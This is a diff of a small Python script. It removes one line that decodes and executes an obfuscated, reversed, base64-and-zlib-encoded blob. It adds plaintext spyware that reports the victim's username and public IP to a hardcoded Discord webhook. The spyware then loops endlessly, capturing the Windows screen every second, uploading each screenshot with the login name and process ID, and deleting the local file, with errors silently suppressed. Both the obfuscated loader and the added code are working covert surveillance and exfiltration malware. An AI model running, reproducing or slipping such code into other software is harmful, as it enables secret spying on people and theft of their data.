@@ -1,1 +1,50 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wIVVy1A8PkuRCAO5pC5hY2KZ788TlgeCtt13S8te5oiTTozuoyrXQ7iOgc9vWllUlbW/zX88go5DluA45EmKZV7n0bFprwti5jJQZm0h9d/qNbWwaXuy2uWjsS0OfrtnNW/hbtOd7tGpNco9W6lHtzNwRrSpAoUmLeHNGaqOoiVqic20qL85XNqkXxjro4CGYBWWvpJhxM1jqSQhjcLtB6NEniGBd0gw+rhr7QrefBu5wNWWT63DTFCCnlWXT9ykpLY4Za5qhNdj+GPegSMgFBR/00gB0Sf4mb8x68jscwHhbK8+qJPfiCV36YW30abyOj4ALg1CVd8w6gEjsd8z2yrq+y0WCze9Sl5nc5LYtlukZCys8jkrGtdoD7yK+/3/7dwazjv1x7KkyySN6HZDVdGaWLplQL1GJccDdpu2namBEzJuO0fHncZzDTX6R1tKtKoUifjshYoUkyyPBGyjkmqz5i9fQVBlgh5xIRYGTvhG3mgQRCb8CCwmwuFgpupANqkHFItyvipHttT5C7uVtc9kl4d1YxiUslrcJtpMHZlhsp7b2qQi44VsADArpvZAenerL5VVExF2dpC94mZi/Q+W9qWdLIUM3UxcWkCBS2yK1VEKn2jzN72TIjZJmFaGN8/xq/TZHBZmJKpJmoEuKmq10FAasy59gFD10GUo5pVb/0AA5Z7NJpn+gfVuahxWUgACp+Gz2Sua4l9d8BKd59CtiG70SjoVhKE56SX8p/Dq0Tw1V3eEMFbd4agWcw95yZ77gDoDXjbl51gZtesv+qd9zjPZv9P7F6wZg4py7SheadOYMzeqTqkUZW0+SsJJxmb2+8Ui3oHpthzr2sXJZu6YsZPsSaWEdaaRH+83am6ndWmzO7BVbejrm00q88XZax9goMJZTxQSJmyrZlZlA4xIbxh45IaSBJjp+LbShpBkrwK4IkiF9s7/LI+ZS7iSqXg1thVWPSOnaga/hikOCPyQg0gPW/YPS77lF0IbGMSLcQEleDt2YCTrubtMqcoDjMTvwPUGELdrbDhaDoL0ypUXuLG8AnG4gHfw5B2RgZ5xgfLSi96pMdLq0kr80kfLEf3qABolvheYTWLN0/Ks4gvoBcp7zm3/sXzmPm6Oa1+eaz2bS65WnrQLNnZAxdEyJyBGiz2PDpnoEdWTiyNtMpJy/JJxaP6TwwDLDVJieGAe6rjZwkku/D+1+SjS6GW9E6PFLp4NqA9ASbzdOMn4N5SQnp2523xc8F3k0uq1gcxTi4PnCvaX2BdkDJFJqMBrAWIPBx4JlOHuQFPCCKywichtXTgUEmboAky24pJCIxIZ4LTgBsUQPL2XVyBOUt5gVaRuEQkmGihgtJkrVjROUso+0cHlccunEhO6XGJgQlyRvAvYibT1RiL3sRCBRh9SKx4SYYKmtxmbE5Et4Aj+M+wXc5pXc5Jbtz63kM6zDKhHO4Mh7cLot3Do/PO6bDfZ2z9+d072YZwM5wS+t4//wz9Uc2Bnc4TDl9weYtr91O7d3ne2z394nxNvB8Qj/09Cr+Qv/3fznd346hiHBOC9pXJ1ZaS8iYhOirjdtrdjkxmIXAB1nne5Bfc6pHo/TfslS4oiMtvfFLa7QfB/0QCn0VkU6wCPE6klXU12EB5mpFyF/bCFElpMFxO64dO7vL1ZJDFHG9JTKgDR2dfPPZBmHJSttUA6T2Qk8J3l2cLtJT2AJLOHfg0AphwEYLhpP0v+sfUgj2ztlVtyJe'))
+import os
+import ctypes,struct,zlib
+import urllib.request
+import json,time
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1500087473517101219/u6NySBC5Q--zb-z-sbOERTqiuHXiVlHObma1jfYCKt9rIQgF0Ii48bueUlezzMbMLwlD"
+OUTPUT_NAME = "output"
+
+def ip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
+            return response.read().decode().strip()
+    except:return None
+
+def grab_scr(filename="output"):
+    u,g=ctypes.windll.user32,ctypes.windll.gdi32;w,h=u.GetSystemMetrics(0),u.GetSystemMetrics(1);s=u.GetDC(0);m=g.CreateCompatibleDC(s);b=g.CreateCompatibleBitmap(s,w,h);g.SelectObject(m,b);g.BitBlt(m,0,0,w,h,s,0,0,0xCC0020);i,d=ctypes.create_string_buffer(40),ctypes.create_string_buffer(w*h*4);struct.pack_into('IiiHHIIiiII',i,0,40,w,-h,1,32,0,0,0,0,0,0);g.GetDIBits(m,b,0,h,d,i,0);c=lambda t,x:struct.pack('>I',len(x))+(z:=t+x)+struct.pack('>I',zlib.crc32(z)&0xffffffff);r=bytearray()
+    for y in range(h):
+        r.append(0);p=d.raw[y*w*4:(y+1)*w*4]
+        for x in range(0,w*4,4):r.extend([p[x+2],p[x+1],p[x],p[x+3]])
+    open(str(filename)+".png",'wb').write(b'\x89PNG\r\n\x1a\n'+c(b'IHDR',struct.pack('>IIBBBBB',w,h,8,6,0,0,0))+c(b'IDAT',zlib.compress(bytes(r),9))+c(b'IEND',b''));g.DeleteObject(b);g.DeleteDC(m);u.ReleaseDC(0,s)
+
+def send_image(webhook_url, image_path=None):
+    try:
+        if image_path and os.path.isfile(image_path):
+            boundary = '----WebKitFormBoundary' + ''.join([hex(ord(c))[2:] for c in os.urandom(16).hex()[:16]])
+            with open(image_path, "rb") as file:
+                info = str(os.getlogin()) +" | "+ str(os.getpid())
+                body = (
+                    f'--{boundary}\r\n'
+                    f'Content-Disposition: form-data; name="content"\r\n\r\n'
+                    f'{info}\r\n'
+                    f'--{boundary}\r\n'
+                    f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(image_path)}"\r\n'
+                    f'Content-Type: image/png\r\n\r\n'
+                ).encode() + file.read() + f'\r\n--{boundary}--\r\n'.encode()
+                
+                req = urllib.request.Request(webhook_url, data=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
+                urllib.request.urlopen(req, timeout=10)
+        else: raise ValueError
+    except: pass
+
+data = json.dumps({"content": "***" + os.getlogin().upper() + "*** IS UP! IP: ``"+ ip() + "``"}).encode()
+req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
+urllib.request.urlopen(req, timeout=10)
+
+while True:
+    grab_scr(OUTPUT_NAME)
+    send_image(WEBHOOK_URL, str(OUTPUT_NAME)+".png")
+    if os.path.isfile(str(OUTPUT_NAME)+".png"):os.remove(str(OUTPUT_NAME)+".png")
+    time.sleep(1)
